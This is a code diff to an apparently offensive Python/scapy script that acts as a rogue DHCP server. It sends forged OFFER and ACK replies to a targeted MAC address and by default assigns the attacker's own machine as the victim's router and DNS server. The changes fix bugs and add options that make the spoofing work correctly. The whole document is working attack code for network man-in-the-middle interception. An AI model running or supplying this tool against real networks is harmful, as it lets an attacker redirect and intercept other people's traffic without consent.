@@ -1,6 +1,7 @@
 from base import Base
 from sys import exit
 from argparse import ArgumentParser
+from binascii import unhexlify
 from scapy.all import *
 
 Base.check_user()
@@ -15,6 +16,7 @@ parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server mac address, i
 parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your ip address')
 parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address')
 parser.add_argument('--netmask', type=str, help='Set network mask, if not set use your netmask')
+parser.add_argument('--broadcast', type=str, help='Set network broadcast, if not set use your broadcast')
 parser.add_argument('--dns', type=str, help='Set DNS server IP address, if not set use your ip address')
 parser.add_argument('--lease_time', type=int, help='Set lease time, default=172800', default=172800)
 
@@ -27,6 +29,7 @@ dhcp_server_mac_address = None
 dhcp_server_ip_address = None
 router_ip_address = None
 network_mask = None
+network_broadcast = None
 dns_server_ip_address = None
 
 if args.interface is None:
@@ -61,6 +64,11 @@ if your_netmask is None:
     print "Network interface: " + current_network_interface + " do not have network mask!"
     exit(1)
 
+your_broadcast = Base.get_netiface_broadcast(current_network_interface)
+if your_broadcast is None:
+    print "Network interface: " + current_network_interface + " do not have broadcast!"
+    exit(1)
+
 if args.dhcp_mac is None:
     dhcp_server_mac_address = your_mac_address
 else:
@@ -69,7 +77,7 @@ else:
 if args.dhcp_ip is None:
     dhcp_server_ip_address = your_ip_address
 else:
-    dhcp_server_ip_address = your_ip_address
+    dhcp_server_ip_address = args.dhcp_ip
 
 if args.router is None:
     router_ip_address = your_ip_address
@@ -81,24 +89,39 @@ if args.netmask is None:
 else:
     network_mask = args.netmask
 
+if args.broadcast is None:
+    network_broadcast = your_broadcast
+else:
+    network_broadcast = args.broadcast
+
 if args.dns is None:
     dns_server_ip_address = your_ip_address
 else:
     dns_server_ip_address = args.dns
+
+print "\r\nNetwork interface: " + current_network_interface
+print "Target mac address: " + target_mac_address
+print "Offer IP: " + offer_ip_address
+print "DHCP server mac address: " + dhcp_server_mac_address
+print "DHCP server ip address: " + dhcp_server_ip_address
+print "Router IP address: " + router_ip_address
+print "Network mask: " + network_mask
+print "DNS server IP address: " + dns_server_ip_address + "\r\n"
 
 
 def make_dhcp_offer_packet(transaction_id):
     return (Ether(src=dhcp_server_mac_address, dst=target_mac_address) /
                     IP(src=dhcp_server_ip_address, dst='255.255.255.255') /
                     UDP(sport=67, dport=68) /
-                    BOOTP(op='BOOTREPLY', chaddr=target_mac_address, yiaddr=offer_ip_address,
-                          siaddr=dhcp_server_ip_address, xid=transaction_id) /
+                    BOOTP(op='BOOTREPLY', chaddr=unhexlify(target_mac_address.replace(":", "")),
+                          yiaddr=offer_ip_address, siaddr="0.0.0.0", xid=transaction_id) /
                     DHCP(options=[("message-type", "offer"),
                                   ('server_id', dhcp_server_ip_address),
                                   ('subnet_mask', network_mask),
+                                  ('broadcast_address', network_broadcast),
                                   ('router', router_ip_address),
                                   ('lease_time', args.lease_time),
-                                  ('domain_name_server', dns_server_ip_address),
+                                  ('name_server', dns_server_ip_address),
                                   "end"]))
 
 
@@ -106,14 +129,15 @@ def make_dhcp_ack_packet(transaction_id, requested_ip):
     return (Ether(src=dhcp_server_mac_address, dst=target_mac_address) /
                   IP(src=dhcp_server_ip_address, dst=requested_ip) /
                   UDP(sport=67, dport=68) /
-                  BOOTP(op='BOOTREPLY', chaddr=target_mac_address, yiaddr=requested_ip,
-                        siaddr=dhcp_server_ip_address, xid=transaction_id) /
+                  BOOTP(op='BOOTREPLY', chaddr=unhexlify(target_mac_address.replace(":", "")),
+                        yiaddr=requested_ip, siaddr="0.0.0.0", xid=transaction_id) /
                   DHCP(options=[("message-type", "ack"),
                                 ('server_id', dhcp_server_ip_address),
                                 ('subnet_mask', network_mask),
+                                ('broadcast_address', network_broadcast),
                                 ('router', router_ip_address),
                                 ('lease_time', args.lease_time),
-                                ('domain_name_server', dns_server_ip_address),
+                                ('name_server', dns_server_ip_address),
                                 "end"]))
 
 
@@ -127,8 +151,10 @@ def dhcp_reply(request):
             sendp(offer_packet, iface=current_network_interface, verbose=False)
 
         if request[DHCP].options[0][1] == 3:
-            print "DHCP REQUEST from:  " + target_mac_address + " transaction id: " + hex(transaction_id)
-            ack_packet = make_dhcp_ack_packet(transaction_id, str(request[DHCP].options[2][1]))
+            requested_ip = str(request[DHCP].options[2][1])
+            print "DHCP REQUEST from:  " + target_mac_address + " transaction id: " + hex(transaction_id) + \
+                  " requested ip: " + requested_ip
+            ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
             sendp(ack_packet, iface=current_network_interface, verbose=False)
 
 
